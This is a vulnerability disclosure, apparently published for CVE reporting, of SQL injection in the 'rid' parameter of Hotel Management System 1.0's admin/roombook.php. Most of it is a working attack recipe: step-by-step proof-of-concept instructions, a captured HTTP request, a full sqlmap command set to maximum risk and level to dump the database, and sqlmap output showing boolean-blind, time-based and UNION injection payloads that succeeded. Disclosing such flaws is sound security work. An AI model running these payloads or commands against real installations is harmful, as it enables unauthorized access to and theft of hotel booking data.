# Hotel Managment System - SQL Injection-1
+ *Exploit Title:* Hotel Managment System - SQL Injection-1
+ *Date:* 2024-02-01
+ *Exploit Author:* Tuba Kavgacı
+ *Vendor Homepage:* https://code-projects.org/hotel-management-system-in-php-with-source-code/
+ *Software Link:* https://download.code-projects.org/details/cd8fc4cb-c6b6-48f7-9cc3-27044a0a26a3
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* Reported, Waiting for CVE number


## Description:
Hotel Managment System 1.0, allows SQL Injection via the 'rid' parameter in Hotel/admin/roombook.php?rid=2. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: http://localhost/Hotel/admin/home.php
+ Click Room Booking Section and click 'action' button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /Hotel/admin/roombook.php?rid=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'rid' parameter to dump the database.
```
python sqlmap.py -r r.txt -p rid --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: rid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: rid=2' AND 7394=7394-- Yhwg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: rid=2' AND (SELECT 3298 FROM (SELECT(SLEEP(5)))AFBF)-- ADNe

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: rid=2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716a6271,0x674c4e4f475061485664626e5363417a72717a626d5841694a4a5245594d59666c674e627342624a,0x7171787071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[18:52:45] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:52:45] [INFO] fetching current database
current database: 'hotel'
```
+ current database : `hotel`
  
![Ekran görüntüsü 2024-02-02 025337](https://github.com/tubakvgc/CVEs/assets/74067343/f02d04b2-f556-451f-8533-3862bfb1bfcf)



  
